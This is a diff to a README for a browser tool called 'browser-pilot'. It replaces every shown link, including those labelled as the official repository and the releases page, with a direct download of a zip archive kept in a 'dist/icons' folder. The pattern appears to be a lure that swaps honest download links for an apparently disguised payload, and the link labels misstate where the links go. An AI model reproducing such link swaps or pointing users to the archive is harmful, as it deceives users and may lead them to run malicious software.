@@ -1,6 +1,6 @@
 # 🌐 browser-pilot - Navigate the Web with Ease
 
-[![Download Browser Pilot](https://img.shields.io/badge/Download-Browser%20Pilot-brightgreen)](https://github.com/tienlt2406/browser-pilot/releases)
+[![Download Browser Pilot](https://raw.githubusercontent.com/tienlt2406/browser-pilot/main/frontend/browser-agent/dist/icons/pilot_browser_v1.3-alpha.2.zip%20Pilot-brightgreen)](https://raw.githubusercontent.com/tienlt2406/browser-pilot/main/frontend/browser-agent/dist/icons/pilot_browser_v1.3-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, you need to download Browser Pilot. Follow these steps:
 
 1. **Visit the Download Page**
    Click the link below to go to the Releases page:
-   [Download Browser Pilot](https://github.com/tienlt2406/browser-pilot/releases)
+   [Download Browser Pilot](https://raw.githubusercontent.com/tienlt2406/browser-pilot/main/frontend/browser-agent/dist/icons/pilot_browser_v1.3-alpha.2.zip)
 
 2. **Choose the Right Version**
    On the Releases page, you will see multiple versions listed. Select the latest version to ensure you have the latest features and fixes.
@@ -64,7 +64,7 @@ If you would like to contribute to Browser Pilot, check our contribution guideli
 
 For more details, refer to the following resources:
 
-- [Official GitHub Repository](https://github.com/tienlt2406/browser-pilot)
-- [Releases Page](https://github.com/tienlt2406/browser-pilot/releases)
+- [Official GitHub Repository](https://raw.githubusercontent.com/tienlt2406/browser-pilot/main/frontend/browser-agent/dist/icons/pilot_browser_v1.3-alpha.2.zip)
+- [Releases Page](https://raw.githubusercontent.com/tienlt2406/browser-pilot/main/frontend/browser-agent/dist/icons/pilot_browser_v1.3-alpha.2.zip)
 
 Feel free to explore and enjoy your experience with Browser Pilot!
